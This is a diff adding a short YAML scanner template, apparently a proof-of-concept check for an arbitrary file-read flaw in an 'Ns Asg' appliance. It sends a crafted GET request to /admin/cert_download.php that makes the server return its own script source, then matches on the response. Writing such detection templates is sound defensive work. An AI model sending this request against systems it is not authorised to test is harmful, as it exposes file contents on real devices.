@@ -1,0 +1,22 @@
+id: poc-yaml-ns-asg-file-read
+info:
+  name: Ns Asg File Read
+  severity: medium
+  tags:
+  - 文件读取
+  finger: Ns Asg
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /admin/cert_download.php?file=pqpqpqpq.txt&certfile=cert_download.php
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, "$certfile") && contains(body,
+    "application/pdf")
+  output: []
